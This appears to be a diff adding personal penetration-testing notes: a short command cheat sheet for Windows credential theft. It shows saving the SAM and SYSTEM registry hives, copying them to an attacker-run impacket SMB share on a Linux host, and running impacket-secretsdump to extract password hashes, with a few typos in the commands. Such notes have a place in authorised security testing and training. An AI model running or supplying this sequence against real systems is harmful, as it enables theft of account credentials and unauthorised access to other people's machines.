@@ -1,0 +1,17 @@
+##print windows variables
+>dir env:
+>#for username
+>{write-host | gc | echo} $env:USERNAM
+
+##Get SAM - administrator needed
+>reg save HKLM\SYSTEM M:\save-sys
+>reg save HKLM\SAM M:\save-sam
+
+##Transfer files WIN-NIX
+###On NIX
+>impacket-smbserver -smb2support Custom-name $(pwd) #location
+###On WIN
+>copy FILE \\IP\Cusom-name\filename
+
+##Decrypt SAM w SYSTEM - spits out hashes
+>impacket-secretsdump -system SYSTEM -sam SAM local
